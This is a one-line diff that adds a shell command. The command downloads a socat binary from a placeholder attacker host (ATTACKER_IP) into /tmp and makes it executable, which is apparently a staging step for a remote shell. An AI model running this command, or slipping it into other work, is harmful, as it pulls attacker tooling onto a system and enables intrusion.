@@ -1,0 +1,1 @@
+curl -o /tmp/socat http://ATTACKER_IP/tools/socat && chmod +x /tmp/socat
